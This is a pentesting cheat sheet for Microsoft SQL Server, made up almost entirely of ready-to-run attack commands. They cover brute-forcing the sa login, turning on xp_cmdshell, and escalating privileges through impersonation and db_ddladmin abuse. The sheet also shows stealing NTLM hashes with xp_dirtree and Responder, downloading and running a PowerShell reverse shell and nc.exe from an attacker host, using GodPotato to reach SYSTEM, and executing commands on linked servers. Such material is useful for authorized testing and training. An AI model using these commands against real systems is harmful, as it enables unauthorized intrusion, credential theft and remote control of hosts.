# üéØ MSSQL Pentesting Checklist & Commands

## What am I realistically expecting to find here?

- [x] Service banner revealing SQL Server version (for CVE research)
- [x] Valid credentials via default passwords or brute-force
- [x] Access to database content (user tables, saved passwords, configs)
- [x] Ability to execute system commands via `xp_cmdshell` if enabled
- [x] Ability to enable `xp_cmdshell` if permissions allow
- [x] Possibility to steal NTLM hashes via `xp_dirtree` triggering SMB authentication
- [x] Evidence of linked servers for lateral movement
- [x] **Host Privilege Escalation** via `SeImpersonatePrivilege` (e.g., GodPotato)
- [x] **Database Privilege Escalation** via Impersonation (`EXECUTE AS LOGIN`)
- [x] **Database Privilege Escalation** via `db_ddladmin` abuse (`sp_syspolicy_purge_history`)
- [x] Sensitive data in queryable tables that can be used for further attacks

***

# ‚úÖ MSSQL - Unauthenticated Enumeration

## üîç Port Scan & Banner Grabbing

```bash
# Use -A for a comprehensive scan including version info, script scanning, and NTLM info
# The default MSSQL port is 1433/tcp
nmap -p 1433 -A <IP> -oN mssql_nmap.txt
```
## üîì Brute-Force Credentials

```c
hydra -l sa -P rockyou.txt -V <IP> mssql
hydra -L users.txt -P passwords.txt <IP> mssql -vV -I -u

# Nmap brute
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Use the --local-auth flag for SQL Server authentication [cite: 40]
crackmapexec mssql 192.168.1.198 -u sa -p /usr/share/wordlists/fasttrack.txt --local-auth
```
---
---
---
# ‚úÖ MSSQL - Authenticated Enumeration & Exploitation

```c
# sqsh
sqsh -S <IP> -U sa
sqsh -S <IP> -U sa -P password

# mssqlclient.py (Impacket)
mssqlclient.py <user>:<password>@<IP>
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

## üß† Useful Queries (Data Extraction)

```c
-- #################################################################
-- ## üöÄ SERVER AND INSTANCE ENUMERATION
-- #################################################################

-- Get the full version, OS, and architecture
SELECT @@version;

-- Get the Windows account running the MSSQL service
SELECT SERVICE_ACCOUNT from sys.dm_server_services;

-- Check if the current login is a sysadmin (1 = Yes, 0 = No)
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Get the current database login/user name
SELECT SYSTEM_USER;

-- Get the name of the local SQL Server
SELECT @@SERVERNAME;

-- List any linked servers that can be queried
SELECT * FROM sys.servers;

-- Lists all server-level configuration options (e.g., if xp_cmdshell is enabled)
EXEC sp_configure;


-- #################################################################
-- ## üíæ DATABASE AND SCHEMA ENUMERATION
-- #################################################################

-- Lists all databases on the server (modern view)
SELECT name FROM master.sys.databases;

-- Lists all standard tables in the specified database
SELECT table_name FROM <DB_NAME>.INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE';

-- Lists all columns for a specific table (replace 'Users' with target table)
SELECT TABLE_NAME, COLUMN_NAME FROM <DB_NAME>.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Users';

-- Lists all database views
SELECT name FROM <DB_NAME>.sys.views;

-- Dump all data from a table (replace <DB> and <table>)
SELECT * from [DB].[dbo].<table>;


-- #################################################################
-- ## üë• USER, LOGIN, AND PERMISSION ENUMERATION
-- #################################################################

-- Lists all server-level logins (who can connect to the server)
SELECT name FROM master.sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN');

-- Lists all users in the CURRENT database
SELECT name FROM sys.database_principals WHERE type_desc IN ('SQL_USER', 'WINDOWS_USER');

-- Lists which users belong to which database roles
SELECT 
    member.name AS User, 
    role.name AS Role 
FROM sys.database_role_members AS members 
JOIN sys.database_principals AS role ON members.role_principal_id = role.principal_id 
JOIN sys.database_principals AS member ON members.member_principal_id = member.principal_id;

-- Lists all explicit and inherited permissions for the current user in the current database
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');


-- #################################################################
-- ## üí° ADVANCED AND COMMAND EXECUTION (REQUIRES HIGH PRIVILEGES)
-- #################################################################

-- Checks if the xp_cmdshell extended stored procedure exists
SELECT * FROM master.sys.extended_procedures WHERE name = 'xp_cmdshell';

-- Attempts to ENABLE xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Executes an OS command (e.g., 'whoami')
EXEC xp_cmdshell 'whoami';

-- Checks if OLE Automation Procedures are enabled
SELECT * FROM sys.configurations WHERE name = 'Ole Automation Procedures';

-- Attempts to ENABLE OLE Automation Procedures (requires sysadmin)
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

## ‚öîÔ∏è Database Privilege Escalation

### 1. Impersonation (EXECUTE AS LOGIN)

```c
-- Example SQL to grant IMPERSONATE permission:
USE master;
GRANT IMPERSONATE ON LOGIN::sa to [Zelda];
GO

-- Connect as the low-privilege user and then impersonate:
SQL (zelda guest@master)> enum_impersonate
-- ... output showing GRANT IMPERSONATE on LOGIN 'sa' to 'zelda' [cite: 72, 73]
SQL (zelda guest@msdb)> EXECUTE AS LOGIN = 'sa' [cite: 73]
SQL (sa dbo@msdb)>
```

### 2. db_ddladmin Abuse (sp_syspolicy_purge_history)

If a user (link) is a member of the db_ddladmin database role on the msdb database , they can modify the sp_syspolicy_purge_history system stored procedure to add themselves to the sysadmin server role.


```c
-- Check if user is a sysadmin (should return 0 initially) [cite: 87, 88]
SQL (link guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
0  

-- Use the msdb database
SQL (link guest@master)> use [msdb]

-- Alter the stored procedure to add the user to sysadmin [cite: 92, 93]
SQL (link link@msdb)> ALTER PROCEDURE [dbo].[sp_syspolicy_purge_history] 
AS 
BEGIN 
    ALTER SERVER ROLE [sysadmin] ADD MEMBER [link] 
END

-- Check again after the procedure has executed (should return 1) [cite: 95, 96]
SQL (link link@msdb)> SELECT IS_SRVROLEMEMBER('sysadmin')
1
```

## üß≤ NTLM Hash Stealing (via xp_dirtree)

```c
# Attacker listener setup (e.g., using Responder)
sudo responder -I eth0

# On the MSSQL server, trigger SMB authentication (assuming connection via impacket-mssqlclient)
SQL (link dbo@website_db)> xp_dirtree \\192.168.1.210\shared

# Responder output will show the NTLMv2 hash: [cite: 101, 102]
# [SMB] NTLMv2-SSP Username : BORDERGATE\SERVER1$
# [SMB] NTLMv2-SSP Hash       : ...
```

## üí• RCE via xp_cmdshell & Host Privilege Escalation

> Enable xp_cmdshell

```c
-- Manual SQL to enable xp_cmdshell:
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'xp_cmdshell', 1;
reconfigure;
```

> Impacket Helper Command:

```c
SQL (sa dbo@msdb)> enable_xp_cmdshell
```

> Command Execution Examples

```c
xp_cmdshell 'whoami /all';
xp_cmdshell 'systeminfo';
xp_cmdshell 'net user';
xp_cmdshell 'reg query HKLM /f pass /t REG_SZ /s';
xp_cmdshell 'findstr /si password *.txt *.ini *.config *.xml';
xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://<IP>/Invoke-PowerShellTcp.ps1')";
xp_cmdshell "certutil -urlcache -f 'http://<IP>/nc.exe' nc.exe";
```

> Host Privilege Escalation (via SeImpersonatePrivilege)

```c
-- Check for SeImpersonatePrivilege
xp_cmdshell 'whoami /priv';

-- If enabled, upload and run GodPotato (replace <ATTACKER_IP> with your IP)
SQL (link dbo@msdb)> xp_cmdshell curl 192.168.1.210/GodPotato-NET4.exe -o C:\Windows\Tasks\potato.exe [cite: 124]
SQL (link dbo@msdb)> xp_cmdshell C:\Windows\Tasks\potato.exe -cmd "cmd /c whoami" [cite: 125]
# ... output showing successful escalation:
nt authority\system [cite: 133]
```

## üóÉ Linked Server Exploitation


> Impacket Usage

```c
# Enumerate linked servers (e.g., finding SERVER2 linked via 'sa' credentials) [cite: 141, 142, 145]
SQL (link dbo@master)> enum_links

# Use a linked server and execute a command
SQL (link dbo@master)> use_link SERVER2 [cite: 145]
SQL >SERVER2 (sa dbo@master)> xp_cmdshell hostname [cite: 146]
```

> Manual SQL Commands

```c
-- Enable xp_cmdshell and run commands on the linked server (SERVER2)
EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT SERVER2 [cite: 148, 149]
EXEC ('exec master..xp_cmdshell ''hostname''') AT SERVER2 [cite: 149, 150]
```




